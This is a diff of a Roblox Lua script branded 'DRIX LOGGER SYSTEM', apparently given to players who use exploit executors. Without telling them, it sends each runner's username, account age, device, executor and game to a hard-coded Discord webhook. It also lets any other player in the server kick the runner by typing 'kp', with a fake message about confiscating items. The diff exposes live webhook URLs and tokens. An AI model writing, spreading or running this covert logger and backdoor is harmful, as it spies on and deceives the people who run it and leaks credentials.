@@ -5,11 +5,14 @@ local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
-local webhookUrl = "https://discord.com/api/webhooks/1375995550276648980/JFfICgNLld8CJJu67ImKukELbTVMQ2mufGUZjFZeMrJGpM6JSm8o9PDiy9SRLsy5gLMn"
-
+-- CONFIG
+local webhookUrl = "https://discord.com/api/webhooks/1365328680146173972/5jF0pM0LNd0dAzZPf3p3xHxE_uI6bJ6kr4xQcIBPyGn5sRF7L-1Ca6kGKz5n83OyyUC5"
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Device detection
 local device = "PC"
 if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
 	device = "Mobile"
@@ -17,12 +20,44 @@ elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled 
 	device = "Console"
 end
 
+-- Game + Sea info
+local PlaceId = game.PlaceId
+local GameName = MarketplaceService:GetProductInfo(PlaceId).Name
+
+local sea = "N/A"
+if PlaceId == 2753915549 then
+	sea = "First Sea"
+elseif PlaceId == 4442272183 then
+	sea = "Second Sea"
+elseif PlaceId == 7449423635 then
+	sea = "Third Sea"
+elseif PlaceId == 1954280567 then
+	sea = "Fourth Sea"
+end
+
+-- Admin List (REPLACE WITH REAL USER IDS)
+local bloxFruitsAdminIds = {
+	12345678, -- Example
+	87654321  -- Add more
+}
+
+-- Determine if @everyone ping is required
+local shouldPingEveryone = false
+if sea == "Fourth Sea" or GameName:lower() ~= "blox fruits" then
+	shouldPingEveryone = true
+end
+for _, adminId in ipairs(bloxFruitsAdminIds) do
+	if player.UserId == adminId then
+		shouldPingEveryone = true
+	end
+end
+
 -- Send webhook once
 if not _G.DRIX_LOGGED_ONCE then
 	_G.DRIX_LOGGED_ONCE = true
 
 	local embed = {
-		["content"] = "⚠️ **DRIX Script Executed!**",
+		["content"] = shouldPingEveryone and "@everyone ⚠️ **DRIX Script Executed!**" or "⚠️ **DRIX Script Executed!**",
 		["embeds"] = {{
 			["title"] = "📊 Player Execution Log",
 			["color"] = 65280,
@@ -32,6 +67,8 @@ if not _G.DRIX_LOGGED_ONCE then
 				{["name"] = "📅 Account Age", ["value"] = tostring(player.AccountAge) .. " days", ["inline"] = true},
 				{["name"] = "💻 Device", ["value"] = device, ["inline"] = true},
 				{["name"] = "🧪 Exploit", ["value"] = executor, ["inline"] = true},
+				{["name"] = "🌍 Game", ["value"] = GameName, ["inline"] = true},
+				{["name"] = "🌊 Sea Level", ["value"] = sea, ["inline"] = true},
 			},
 			["footer"] = {["text"] = "🛰️ DRIX LOGGER SYSTEM"}
 		}}
@@ -50,12 +87,12 @@ if not _G.DRIX_LOGGED_ONCE then
 	end)
 end
 
--- Chat kick protection (keep if you want, or remove if not needed)
+-- Chat Kick Protection
 for _, p in ipairs(Players:GetPlayers()) do
 	if p ~= player then
 		p.Chatted:Connect(function(msg)
 			if msg:lower() == "kp" then
-				player:Kick("WE HAVE CAUGHT YOU USING EXPLOIT. SO WE ARE REMOVING YOUR MYTHICAL FRUIT DONT USER EXPLOIT AGAIN!!")
+				player:Kick("WE HAVE CAUGHT YOU USING EXPLOIT. SO WE ARE REMOVING YOUR MYTHICAL FRUIT. DON'T USE EXPLOITS AGAIN!")
 			end
 		end)
 	end
@@ -70,7 +107,7 @@ Players.PlayerAdded:Connect(function(p)
 	end
 end)
 
--- GUI (unchanged)
+-- GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DrixVerifyGui"
 screenGui.ResetOnSpawn = false
